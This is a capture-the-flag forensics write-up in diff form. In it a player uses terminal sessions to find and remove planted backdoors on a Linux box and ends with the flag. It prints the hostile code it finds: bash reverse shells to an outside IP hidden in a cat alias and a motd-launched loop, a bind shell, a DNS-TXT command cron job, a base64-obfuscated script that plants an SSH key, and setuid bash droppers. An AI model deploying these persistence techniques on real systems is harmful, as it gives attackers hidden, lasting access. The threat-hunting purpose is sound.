@@ -1,0 +1,224 @@
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:~$ ls -la
+	total 1200
+	drwxr-xr-x 1 user user    4096 Dec  3 13:08 .
+	drwxr-xr-x 1 root root    4096 May 14  2021 ..
+	-rwsr-xr-x 1 root root 1183448 May 14  2021 .backdoor
+	-rw------- 1 user user      78 Dec  3 13:03 .bash_history
+	-rw-r--r-- 1 user user     220 Feb 25  2020 .bash_logout
+	-rw-rw-r-- 1 user user    3856 Dec  3 13:04 .bashrc
+	-rw-rw-r-- 1 user user    3855 Apr 23  2021 .bashrc~
+	drwx------ 2 user user    4096 Dec  3 13:00 .cache
+	-rw-r--r-- 1 user user     807 Feb 25  2020 .profile
+	-rw-r--r-- 1 user user       0 Dec  3 13:04 .sudo_as_admin_successful
+	-rw------- 1 user user    4260 Dec  3 13:08 .viminfo
+
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:~$ rm -rf .backdoor
+
+> delete cat alias revshell in user .bashrc
+	alias cat='(bash -i >& /dev/tcp/172.17.0.1/443 0>&1 & disown) 2>/dev/null; cat'
+> user@forensicspersistence-1644999-75fc79bf8b-hjvjb:~$ sudo rm -rf /dev/tcp/172.17.0.1/443
+
+> in root .bashrc delete line
+	alertd -e /bin/bash -lnp 4444 &
+> user@forensicspersistence-1644999-75fc79bf8b-hjvjb:~$ sudo find / -name alertd 2>/dev/null
+	/usr/bin/alertd
+> user@forensicspersistence-1644999-75fc79bf8b-hjvjb:~$ sudo rm -rf /usr/bin/alertd
+
+> linpeas processes
+	root           1  0.0  0.0   2616    68 ?        Ss   12:30   0:00 /bin/sh -c /usr/sbin/sshd -D -p 23   
+	user         149  0.0  0.0  13900  5308 ?        S    12:40   0:00      _ sshd: user@pts/0
+	user         150  0.0  0.0   6000  3852 pts/0    Ss   12:40   0:00          _ -bash
+	user         160  0.2  0.0   3620  2760 pts/0    S+   12:40   0:00              _ /bin/sh ./linpeas.sh
+	user        2959  0.0  0.0   3620  1220 pts/0    S+   12:41   0:00                  _ /bin/sh ./linpeas.sh
+	user        2961  0.0  0.0   7656  3252 pts/0    R+   12:41   0:00                  |   _ ps fauxwww
+	user        2963  0.0  0.0   3620  1220 pts/0    S+   12:41   0:00                  _ /bin/sh ./linpeas.sh
+	root          18  0.0  0.0   3984  1384 ?        S    12:32   0:00 /bin/bash /var/lib/private/connectivity-check
+	root        2893  0.0  0.0   2516   588 ?        S    12:41   0:00  _ sleep 10
+	root         113  0.0  0.0   3984  2936 ?        S    12:40   0:00 /bin/bash /var/lib/private/connectivity-check
+	root         116  0.0  0.0   3984   236 ?        S    12:40   0:00  _ /bin/bash /var/lib/private/connectivity-check
+	root         129  0.0  0.0   3984  2980 ?        S    12:40   0:00 /bin/bash /var/lib/private/connectivity-check
+	root         132  0.0  0.0   3984   236 ?        S    12:40   0:00  _ /bin/bash /var/lib/private/connectivity-check
+	root         145  0.0  0.0   3984  3000 ?        S    12:40   0:00 /bin/bash /var/lib/private/connectivity-check
+	root         148  0.0  0.0   3984   240 ?        S    12:40   0:00  _ /bin/bash /var/lib/private/connectivity-check
+
+> user@forensicspersistence-1644999-75fc79bf8b-hjvjb:~$ sudo find / -name *connectivity-check* 2>/dev/null
+	/etc/update-motd.d/30-connectivity-check
+	/var/lib/private/connectivity-check
+
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/var/lib$ sudo cat /var/lib/private/connectivity-check
+	#!/bin/bash
+
+	while true; do
+	    nohup bash -i >& /dev/tcp/172.17.0.1/443 0>&1;
+	    sleep 10;
+	done
+
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/etc/update-motd.d$ cat /etc/update-motd.d/30-connectivity-check 
+	#!/bin/bash
+
+	nohup /var/lib/private/connectivity-check &
+
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/var/lib$ sudo rm -rf /var/lib/private/connectivity-check /etc/update-motd.d/30-connectivity-check
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/var/lib$ sudo kill -9 18 54 119 121
+
+> linpeas reports cronjob
+	/usr/bin/crontab                                                                                        
+	* * * * * /bin/sh -c "sh -c $(dig imf0rce.htb TXT +short @ns.imf0rce.htb)"
+	incrontab Not Found
+	-rw-r--r-- 1 root root    1042 Feb 13  2020 /etc/crontab  
+
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:~$ sudo rm -rf /var/spool/cron/crontabs/user
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/etc$ ls -la /etc/cron.*
+	/etc/cron.d:
+	total 24
+	drwxr-xr-x 1 root root 4096 May 14  2021 .
+	drwxr-xr-x 1 root root 4096 May 14  2021 ..
+	-rw-r--r-- 1 root root  102 Feb 13  2020 .placeholder
+	-rw-r--r-- 1 root root  285 Jul 16  2019 anacron
+	-rw-r--r-- 1 root root  201 Feb 14  2020 e2scrub_all
+	-rw-r--r-- 1 root root  191 May 14  2021 popularity-contest
+
+	/etc/cron.daily:
+	total 52
+	drwxr-xr-x 1 root root 4096 May 14  2021 .
+	drwxr-xr-x 1 root root 4096 May 14  2021 ..
+	-rw-r--r-- 1 root root  102 Feb 13  2020 .placeholder
+	-rwxr-xr-x 1 root root  311 Jul 16  2019 0anacron
+	-rwxr-xr-x 1 root root  301 Apr 23  2021 access-up
+	-rwxr-xr-x 1 root root 1478 Apr  9  2020 apt-compat
+	-rwxr-xr-x 1 root root  355 Dec 29  2017 bsdmainutils
+	-rwxr-xr-x 1 root root 1187 Sep  5  2019 dpkg
+	-rwxr-xr-x 1 root root  377 Jan 21  2019 logrotate
+	-rwxr-xr-x 1 root root 1123 Feb 25  2020 man-db
+	-rwxr-xr-x 1 root root 4574 Jul 18  2019 popularity-contest
+	-rwxr-xr-x 1 root root  199 Jan 24  2021 pyssh
+
+	/etc/cron.hourly:
+	total 12
+	drwxr-xr-x 2 root root 4096 May 14  2021 .
+	drwxr-xr-x 1 root root 4096 May 14  2021 ..
+	-rw-r--r-- 1 root root  102 Feb 13  2020 .placeholder
+
+	/etc/cron.monthly:
+	total 16
+	drwxr-xr-x 2 root root 4096 May 14  2021 .
+	drwxr-xr-x 1 root root 4096 May 14  2021 ..
+	-rw-r--r-- 1 root root  102 Feb 13  2020 .placeholder
+	-rwxr-xr-x 1 root root  313 Jul 16  2019 0anacron
+
+	/etc/cron.weekly:
+	total 20
+	drwxr-xr-x 2 root root 4096 May 14  2021 .
+	drwxr-xr-x 1 root root 4096 May 14  2021 ..
+	-rw-r--r-- 1 root root  102 Feb 13  2020 .placeholder
+	-rwxr-xr-x 1 root root  312 Jul 16  2019 0anacron
+	-rwxr-xr-x 1 root root  813 Feb 25  2020 man-db
+
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/etc$ cat /etc/cron.daily/pyssh
+	#!/bin/sh
+
+	VER=$(python3 -c 'import ssh_import_id; print(ssh_import_id.VERSION)')
+	MAJOR=$(echo $VER | cut -d'.' -f1)
+
+	if [ $MAJOR -le 6 ]; then
+	    /lib/python3/dist-packages/ssh_import_id_update
+	fi
+
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/usr/lib/python3/dist-packages$ find / -name ssh_import_id_update 2>/dev/null
+	/usr/lib/python3/dist-packages/ssh_import_id_update
+
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/usr/lib/python3/dist-packages$ cat /usr/lib/python3/dist-packages/ssh_import_id_update 
+	#!/bin/bash
+
+	KEY=$(echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgbm9ib2R5QG5vdGhpbmcK" | base64 -d)
+	PATH=$(echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d)
+
+	/bin/grep -q "$KEY" "$PATH" || echo "$KEY" >> "$PATH
+
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/usr/lib/python3/dist-packages$ echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgbm9ib2R5QG5vdGhpbmcK" | base64 -d
+	ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRdx5Rq5+Obq66cywz5KW9ofVm0NCZ39EPDA2CJDqx1 nobody@nothing
+
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/usr/lib/python3/dist-packages$ echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d
+	/root/.ssh/authorized_keys
+
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/etc$ sudo rm -rf /usr/lib/python3/dist-packages/ssh_import_id_update /etc/cron.daily/pyssh
+> delete ssh-ed25519 key in root authorized keys
+
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/etc$ cat cron.daily/access-up 
+	#!/bin/bash
+
+	DIRS=("/bin" "/sbin")
+	DIR=${DIRS[$[ $RANDOM % 2 ]]}
+
+	while : ; do
+	    NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
+	    [[ -f "{$DIR}/${NEW_UUID}" ]] || break
+	done
+
+	cp /bin/bash ${DIR}/${NEW_UUID}
+	touch ${DIR}/${NEW_UUID} -r /bin/bash
+	chmod 4755 ${DIR}/${NEW_UUID}
+
+> creates bash copy with perm 4755 in /bin and /sbin with a name of 6 random characters
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/bin$ find / -perm -04755 2>/dev/null
+	/usr/bin/passwd
+	/usr/bin/chfn
+	/usr/bin/su
+	/usr/bin/umount
+	/usr/bin/chsh
+	/usr/bin/newgrp
+	/usr/bin/gpasswd
+	/usr/bin/mount
+	/usr/bin/dlxcrw
+	/usr/bin/mgxttm
+	/usr/bin/sudo
+	/usr/lib/openssh/ssh-keysign
+	/usr/sbin/afdluk
+	/usr/sbin/ppppd
+	/home/user/.backdoor
+	
+> user@forensicspersistence-1644999-75fc79bf8b-ddk4z:/etc$ sudo rm -rf /etc/cron.daily/access-up /usr/bin/dlxcrw /usr/bin/mgxttm /usr/sbin/afdluk /usr/sbin/ppppd
+
+> linpeas report users
+	uid=0(root) gid=0(root) groups=0(root)
+	uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+	uid=10(uucp) gid=10(uucp) groups=10(uucp)
+	uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
+	uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
+	uid=101(systemd-timesync) gid=101(systemd-timesync) groups=101(systemd-timesync)
+	uid=102(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
+	uid=103(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
+	uid=104(messagebus) gid=106(messagebus) groups=106(messagebus)
+	uid=105(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
+	uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
+	uid=13(proxy) gid=13(proxy) groups=13(proxy)
+	uid=2(bin) gid=2(bin) groups=2(bin)
+	uid=3(sys) gid=3(sys) groups=3(sys)
+	uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	uid=34(backup) gid=34(backup) groups=34(backup)
+	uid=38(list) gid=38(list) groups=38(list)
+	uid=39(irc) gid=39(irc) groups=39(irc)
+	uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+	uid=41(gnats) gid=0(root) groups=0(root)
+	uid=5(games) gid=60(games) groups=60(games)
+	uid=6(man) gid=12(man) groups=12(man)
+	uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+	uid=7(lp) gid=7(lp) groups=7(lp)
+	uid=8(mail) gid=8(mail) groups=8(mail)
+	uid=9(news) gid=9(news) groups=9(news)
+
+> gnats is root
+> reset /etc/passwd with correct id and login command
+> delete hash from shadow file for gnats
+
+> user@forensicspersistence-1644999-75fc79bf8b-b85lc:/sbin$ sudo /root/solveme
+	Issue 1 is fully remediated
+	Issue 2 is fully remediated
+	Issue 3 is fully remediated
+	Issue 4 is fully remediated
+	Issue 5 is fully remediated
+	Issue 6 is fully remediated
+	Issue 7 is fully remediated
+	Issue 8 is fully remediated
+
+	Congrats: HTB{7tr3@t_hUntIng_4TW}
